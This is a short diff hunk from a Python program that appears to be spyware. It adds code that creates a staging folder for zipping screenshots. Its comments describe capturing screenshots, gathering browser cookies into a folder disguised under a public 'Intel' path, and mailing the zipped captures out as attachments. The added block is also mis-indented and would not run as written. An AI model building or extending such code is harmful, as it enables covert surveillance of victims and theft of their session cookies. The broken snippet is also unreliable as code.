@@ -72,6 +72,11 @@ current_system_time = datetime.datetime.now()   #Get current system time
 #Screenshots are saved in a folder inside Logs
 #10 Screenshots are sent at a time and are moved to "ToZipScreenshots" for zipping them and send as attachment
 
+#Verify Folder TopZipScreenshots
+newpath = r'C:\Users\Public\Intel\Logs\ToZipScreenshots'
+if not os.path.exists(newpath):
+os.makedirs(newpath)
+
 path = "C:\Users\Public\Intel\Logs"
 path_to_screenshot = "C:\Users\Public\Intel\Logs\Screenshots"   #Screenshots are saved in this folder
 path_to_cookies = "C:\Users\Public\Intel\Logs"  #Cookies will be moved to this folder
